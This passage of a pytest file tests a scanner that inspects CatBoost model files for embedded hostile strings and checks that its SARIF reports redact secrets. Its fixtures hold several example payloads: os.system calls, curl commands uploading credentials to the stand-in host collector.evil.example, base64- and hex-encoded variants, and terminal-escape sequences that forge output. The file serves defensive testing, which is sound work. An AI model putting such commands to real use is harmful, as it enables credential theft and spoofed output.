    assert "curl --password" in sarif
    assert "curl --user" in sarif
    assert "curl -ualice:" in sarif
    assert "collector.evil.example" in sarif
    assert "touch /tmp/pwned" in sarif


def test_catboost_sarif_reports_sanitized_decoded_encoded_payload_evidence(tmp_path: Path) -> None:
    boundary_secret = "sk-boundarysecret1234567890"
    boundary_payload = f'os.system("id"); {"P" * 130} {boundary_secret}'
    base64_raw = (
        'os.system("id"); client_secret=CATBOOST_B64_RAW_SECRET_123456; https://collector.evil.example/upload'
    ).ljust(90, "A")
    base64_payload = base64.b64encode(base64_raw.encode()).decode()
    adjacent_raw = "client_secret=adjacentpass9"
    adjacent_payload = base64.b64encode(adjacent_raw.encode()).decode()
    nested_raw = (f'os.system("id"); blob={adjacent_payload}; https://collector.evil.example/upload').ljust(100, "B")
    nested_payload = base64.b64encode(nested_raw.encode()).decode()
    url_raw = "https://user:urlpass9@collector.evil.example/upload"
    url_payload = base64.b64encode(url_raw.encode()).decode()
    hex_raw = 'os.system("id"); client_secret=CATBOOST_HEX_RAW_SECRET_123456;'
    hex_payload = "".join(f"\\x{byte:02x}" for byte in hex_raw.encode())
    standalone_hex_raw = "sk-standalone-secret1234567890"
    standalone_hex_payload = "".join(f"\\x{byte:02x}" for byte in standalone_hex_raw.encode())
    model_path = tmp_path / "sarif_encoded_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                boundary_payload,
                base64_payload,
                hex_payload,
                url_payload,
                standalone_hex_payload,
                f'os.system("id"); blob={adjacent_payload}; https://collector.evil.example/upload',
                nested_payload,
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_B64_RAW_SECRET" not in failed_details
    assert "CATBOOST_HEX_RAW_SECRET" not in failed_details
    assert "adjacentpass9" not in failed_details
    assert "urlpass9" not in failed_details
    assert "sk-standalone-secret" not in failed_details
    assert "sk-boundary" not in failed_details
    assert base64_payload not in failed_details
    assert hex_payload not in failed_details
    assert url_payload not in failed_details
    assert standalone_hex_payload not in failed_details
    assert adjacent_payload not in failed_details
    assert nested_payload not in failed_details
    assert "CATBOOST_B64_RAW_SECRET" not in sarif
    assert "CATBOOST_HEX_RAW_SECRET" not in sarif
    assert "adjacentpass9" not in sarif
    assert "urlpass9" not in sarif
    assert "sk-standalone-secret" not in sarif
    assert "sk-boundary" not in sarif
    assert base64_payload not in sarif
    assert hex_payload not in sarif
    assert url_payload not in sarif
    assert standalone_hex_payload not in sarif
    assert adjacent_payload not in sarif
    assert nested_payload not in sarif
    assert "os.system" in failed_details
    assert "client_secret=<redacted>" in failed_details
    assert "os.system" in sarif
    assert "client_secret=<redacted>" in sarif


def test_catboost_sarif_redacts_decoded_standalone_base64_secret(tmp_path: Path) -> None:
    standalone_secret = "sk-ABCDEFGHIJKLMNOP"
    standalone_payload = base64.b64encode(standalone_secret.encode()).decode()
    model_path = tmp_path / "sarif_base64_standalone_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                f'os.system("id"); blob={standalone_payload}; https://collector.evil.example/upload',
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert standalone_secret not in failed_details
    assert standalone_payload not in failed_details
    assert standalone_secret not in sarif
    assert standalone_payload not in sarif
    assert "<redacted>" in failed_details
    assert "<redacted>" in sarif


def test_catboost_sarif_redacts_urlsafe_base64_secret(tmp_path: Path) -> None:
    standalone_secret = "sk-ABCDEFGHIJKL"
    standalone_payload = base64.urlsafe_b64encode(standalone_secret.encode()).decode().rstrip("=")
    model_path = tmp_path / "sarif_urlsafe_base64_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                f'os.system("id"); blob={standalone_payload}; https://collector.evil.example/upload',
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert standalone_secret not in failed_details
    assert standalone_payload not in failed_details
    assert standalone_secret not in sarif
    assert standalone_payload not in sarif
    assert "<redacted>" in failed_details
    assert "<redacted>" in sarif


def test_catboost_preserves_benign_short_urlsafe_base64_evidence() -> None:
    payload = base64.urlsafe_b64encode(b"ordinary-label1").decode().rstrip("=")

    assert len(payload) == 20
    assert _redact_evidence_for_display(payload) == payload


def test_catboost_redacts_padded_32_character_base64_secret() -> None:
    opaque_secret = b"A1b2C3d4E5f6G7h8I9j0K1"
    payload = base64.b64encode(opaque_secret).decode()

    assert len(payload) == 32
    assert payload.endswith("==")
    assert _redact_evidence_for_display(payload) == "<redacted>"


def test_catboost_preserves_benign_padded_base64_below_secret_threshold() -> None:
    payload = base64.b64encode(b"ordinary-short-token").decode()

    assert len(payload) == 28
    assert _redact_evidence_for_display(payload) == payload


def test_catboost_sarif_redacts_newline_empty_user_and_padded_base64_secrets(tmp_path: Path) -> None:
    line_secret = "LINEBREAK_SECRET_123456"
    user_secret = "password7"
    aws_alias_secret = "aws-alias-secret"
    proxy_alias_secret = "proxy-alias-secret"
    opaque_secret = b"A1b2C3d4E5f6G7h8I9j0K1"
    padded_payload = base64.b64encode(opaque_secret).decode()
    newline_payload = base64.b64encode(
        f'import os\napi_key={line_secret}; os.system("id")'.ljust(90, "A").encode()
    ).decode()
    model_path = tmp_path / "catboost_boundary_secrets.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                newline_payload,
                f'os.system("curl --user :{user_secret} https://collector.evil.example/upload")',
                f'awsSecretAccessKey={aws_alias_secret} os.system("id")',
                f"proxy_authorization: Basic {proxy_alias_secret} curl https://collector.evil.example/upload",
                f'os.system("id"); blob={padded_payload}; https://collector.evil.example/upload',
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    for secret in (
        line_secret,
        user_secret,
        aws_alias_secret,
        proxy_alias_secret,
        padded_payload,
        opaque_secret.decode(),
    ):
        assert secret not in failed_details
        assert secret not in sarif
    assert "api_key=<redacted>" in failed_details
    assert "curl --user :<redacted>" in failed_details
    assert "<redacted>" in sarif


@pytest.mark.parametrize("urlsafe", [False, True])
@pytest.mark.parametrize("marker", ["<redacted>", "<credentials-redacted>"])
def test_attacker_base64_markers_do_not_authorize_decoded_evidence(
    tmp_path: Path,
    marker: str,
    urlsafe: bool,
) -> None:
    raw = f"{marker} CATBOOST_RAW_SECRET_123456"
    encoder = base64.urlsafe_b64encode if urlsafe else base64.b64encode
    payload = encoder(raw.encode()).decode().rstrip("=")
    model_path = tmp_path / f"attacker_marker_{marker[1]}_{urlsafe}.cbm"
    model_path.write_bytes(
        _build_cbm([f'os.system("id"); blob={payload}; https://collector.evil.example/upload']),
    )

    assert _redact_reversible_base64_evidence(payload) == payload
    assert "CATBOOST_RAW_SECRET_123456" not in _redact_evidence_for_display(payload, max_chars=500)

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert "CATBOOST_RAW_SECRET_123456" not in failed_details
    assert "CATBOOST_RAW_SECRET_123456" not in sarif


def test_attacker_base64_marker_does_not_hide_real_assignment_redaction() -> None:
    raw = '<redacted> password=hunter2 os.system("id")'
    payload = base64.urlsafe_b64encode(raw.encode()).decode().rstrip("=")

    redacted = _redact_reversible_base64_evidence(payload)

    assert "hunter2" not in redacted
    assert "[redacted marker]" in redacted
    assert "password=<redacted>" in redacted


def test_catboost_sarif_redacts_generic_serialized_and_ansi_credentials(tmp_path: Path) -> None:
    secrets = ["dbpass7", "escaped8", "option9", "proxy10", "session11"]
    model_path = tmp_path / "catboost_additional_credentials.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                f'os.system("psql postgresql://alice:{secrets[0]}@db.example/prod")',
                rf'os.system("curl https:\/\/alice:{secrets[1]}@collector.evil.example/upload")',
                f"os.system(\"curl --password $'{secrets[2]}' --proxy-user "
                f"$'alice:{secrets[3]}' https://collector.evil.example/upload\")",
                f'os.system("id"); session_id={secrets[4]}',
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    for secret in secrets:
        assert secret not in failed_details
        assert secret not in sarif
    assert "postgresql://<credentials-redacted>@db.example/prod" in failed_details
    assert "https://<credentials-redacted>@collector.evil.example/upload" in failed_details
    assert "os.system" in failed_details


def test_catboost_encoded_evidence_escapes_terminal_controls(tmp_path: Path) -> None:
    decoded_base64 = ('os.system("id")\x1b[2J\x1b[HFORGED OUTPUT\n' + ("A" * 80)).encode()
    base64_payload = base64.b64encode(decoded_base64).decode()
    decoded_hex = b'os.system("id")\x1b[2J\rFORGED'
    hex_payload = "".join(f"\\x{byte:02x}" for byte in decoded_hex)
    model_path = tmp_path / "catboost_control_evidence.cbm"
    model_path.write_bytes(_build_cbm([base64_payload, hex_payload]))

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    encoded_check = next(check for check in result.checks if check.name == "Encoded Payload Indicator Check")
    excerpts = [match["excerpt"] for match in encoded_check.details["matches"]]
    sarif = format_sarif_output(result, [str(model_path)])

    assert encoded_check.status == CheckStatus.FAILED
    assert all("\x1b" not in excerpt and "\n" not in excerpt and "\r" not in excerpt for excerpt in excerpts)
    assert "\x1b" not in sarif
    assert "\r" not in sarif
    assert any(r"\u001b" in excerpt for excerpt in excerpts)


def test_catboost_evidence_wrapper_bounds_reversible_payload_scan(monkeypatch: pytest.MonkeyPatch) -> None:
    processed_lengths: list[int] = []
    original = catboost_scanner._redact_reversible_base64_evidence

    def record_length(text: str, depth: int = 0) -> str:
        processed_lengths.append(len(text))
        return original(text, depth)

    monkeypatch.setattr(catboost_scanner, "_redact_reversible_base64_evidence", record_length)

    _redact_evidence_for_display('os.system("id") ' * 700_000, max_chars=160)

    assert processed_lengths
    assert max(processed_lengths) <= 160 + max(
        catboost_scanner.EVIDENCE_REDACTION_LOOKAHEAD_CHARS,
        catboost_scanner._MAX_ENCODED_EVIDENCE_CHARS,
    )


def test_false_positive_reduction_for_common_exec_system_words(tmp_path: Path) -> None:
    model_path = tmp_path / "false_positive_guard.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_system",
                "exec_time_ms",
                "system_feature_importance",
                "cat_feature_hash_to_string",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    command_correlation = [check for check in result.checks if check.name == "Command/Network Correlation Check"]
    assert command_correlation
    assert command_correlation[0].status == CheckStatus.PASSED
    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)


def test_catboost_regression_routes_to_catboost_scanner(tmp_path: Path) -> None:
    model_path = tmp_path / "route.cbm"
    model_path.write_bytes(_build_cbm(["feature_names", "loss_function"]))

    scanner = get_scanner_for_file(str(model_path))

    assert scanner is not None
    assert scanner.name == "catboost"

    assert detect_file_format_from_magic(str(model_path)) == "catboost"
    assert detect_file_format(str(model_path)) == "catboost"
